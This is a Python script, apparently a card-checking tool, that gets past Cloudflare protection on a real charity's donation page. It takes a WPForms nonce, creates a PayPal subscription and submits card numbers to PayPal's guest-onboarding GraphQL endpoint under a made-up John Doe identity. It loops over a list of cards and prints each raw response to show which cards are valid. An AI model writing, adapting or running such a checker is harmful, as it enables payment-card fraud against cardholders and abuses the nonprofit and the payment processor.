import cloudscraper
import json
import re
import random
import string

def test_probe(cc, mm, yy, cvc):
    s = cloudscraper.create_scraper()
    r_page = s.get('https://lounsburyhouse.org/donate/', timeout=15)
    nonce = re.search(r'"create_subscription":"([^"]+)"', r_page.text).group(1)

    email = 'test' + ''.join(random.choices(string.digits, k=5)) + '@gmail.com'
    data = {
        'action': 'wpforms_paypal_commerce_create_subscription',
        'page_url': 'https://lounsburyhouse.org/donate/',
        'page_id': '34',
        'form_id': '4387',
        'nonce': nonce,
        'payment_method': 'paypal_commerce',
        'data': f'wpforms[fields][1][first]=John&wpforms[fields][1][last]=Doe&wpforms[fields][2]={email}&wpforms[fields][15]=10.00&wpforms[fields][16]=once&wpforms[submit]=wpforms-submit&wpforms[id]=4387'
    }
    r_sub = s.post('https://lounsburyhouse.org/wp-admin/admin-ajax.php', data=data, timeout=15)
    id_token = re.search(r'"id":"([^"]+)"', r_sub.text).group(1)

    r_cart = s.post(f'https://www.paypal.com/smart/api/billagmt/subscriptions/{id_token}/cartid', headers={'X-Requested-By': 'smart-payment-buttons', 'Origin': 'https://www.paypal.com'}, timeout=15)
    tok = r_cart.json()['token']

    payload = {
        'operationName': 'OnboardGuestMutation',
        'variables': {
            'card': {'cardNumber': cc, 'expirationDate': f'{mm}/{yy}', 'securityCode': cvc, 'type': 'VISA'},
            'country': 'US', 'email': email, 'firstName': 'John', 'lastName': 'Doe',
            'phone': {'countryCode': '1', 'number': '5159662869', 'type': 'MOBILE'},
            'supportedThreeDsExperiences': ['IFRAME'], 'token': tok,
            'billingAddress': {'line1': '123 Main St', 'city': 'New York', 'state': 'NY', 'postalCode': '10001', 'country': 'US', 'familyName': 'Doe', 'givenName': 'John'},
            'shippingAddress': {'line1': '', 'city': '', 'state': '', 'postalCode': '', 'accountQuality': {'autoCompleteType': 'MANUAL', 'isUserModified': False}, 'country': 'US', 'familyName': 'John', 'givenName': 'Doe'},
            'crsData': None
        },
        'query': '''mutation OnboardGuestMutation($card: CardInput, $billingAddress: AddressInput, $country: CountryCodes, $email: String, $firstName: String!, $lastName: String!, $phone: PhoneInput, $token: String!) {
          onboardAccount: onboardGuest(billingAddress: $billingAddress, card: $card, country: $country, email: $email, firstName: $firstName, lastName: $lastName, phone: $phone, token: $token) {
            buyer { auth { accessToken } userId }
            flags { is3DSecureRequired }
          }
        }'''
    }
    r_gql = s.post('https://www.paypal.com/graphql?OnboardGuestMutation', headers={'Paypal-Client-Context': tok, 'X-App-Name': 'checkoutuinodeweb_weasley', 'X-Country': 'US'}, json=payload, timeout=20)
    print(f"Card {cc} -> Status Code: {r_gql.status_code}")
    print("Raw Response:", r_gql.text)

if __name__ == '__main__':
    for c in ["4000001234567890", "4033060047342909"]:
        print("="*50)
        test_probe(c, "12", "28", "123")
